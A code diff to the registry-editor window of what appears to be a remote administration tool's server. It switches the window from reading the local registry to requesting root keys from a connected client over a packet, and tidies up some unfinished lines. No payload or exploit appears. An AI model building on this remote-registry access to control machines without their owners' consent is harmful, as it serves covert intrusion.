@@ -13,8 +13,6 @@ namespace xServer.Forms
 
         private readonly object locker = new object();
 
-        public Dictionary<TreeNode, 
-
         public FrmRegistryEditor(Client c)
         {
             _connectClient = c;
@@ -22,24 +20,29 @@ namespace xServer.Forms
 
             InitializeComponent();
 
-            // Request the top-level node being referenced.
-            RegistryKey key = Registry.CurrentUser;
+            // By passing no search arguments, we tell the client to provide us with a response of its root keys.
+            new xServer.Core.Packets.ServerPackets.DoLoadRegistryKey(null).Execute(_connectClient);
+        }
 
-            TreeNode registryKeys = LoadRootSubKeyDirectories(key);
-            if ((registryKeys != null) && registryKeys.Nodes.Count >= 0)
+        public void AddRootKey(RegSeekerMatch match)
+        {
+            tvRegistryDirectory.Invoke((MethodInvoker)delegate
             {
-                tvRegistryDirectory.Nodes.Add(registryKeys);
-            }
+                TreeNode node = CreateNode(match.Key, match.Value, null);
+                tvRegistryDirectory.Nodes.Add(node);
+
+                node.Nodes.Add(new TreeNode());
+            });
         }
 
         public void AddRootKey(RegistryKey key)
         {
             tvRegistryDirectory.Invoke((MethodInvoker)delegate
             {
-            TreeNode node = CreateNode(key.Name, key.Name, key);
-            tvRegistryDirectory.Nodes.Add(node);
+                TreeNode node = CreateNode(key.Name, key.Name, key);
+                tvRegistryDirectory.Nodes.Add(node);
 
-            node.Nodes.Add(new TreeNode());
+                node.Nodes.Add(new TreeNode());
             });
         }
 
@@ -98,12 +101,10 @@ namespace xServer.Forms
                 List<RegistryKey> KeysFromNode = new List<RegistryKey>();
                 
                 // Send a request for registry keys on this node.
-                new xServer.Core.Packets.ServerPackets.DoLoadRegistryKey(tvRegistryDirectory.SelectedNode).Execute(_connectClient);
 
-                // Validate the response... Make sure it is referencing a valid node.
+                // ToDo: (After 
 
-                // The handler will add the response data to the ListView.
-
+                // ToDo: Move the code below in a spot that the RegistryHandler will make use of
                 if (KeysFromNode.Count < 1)
                 {
                     // If there are valid keys to use from the selected TreeNode, populate the ListView with it.
@@ -130,7 +131,7 @@ namespace xServer.Forms
 
         private void FrmRegistryEditor_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (_connectClient.Value.FrmRe != null)
+            if (_connectClient.Value != null)
                 _connectClient.Value.FrmRe = null;
         }
 
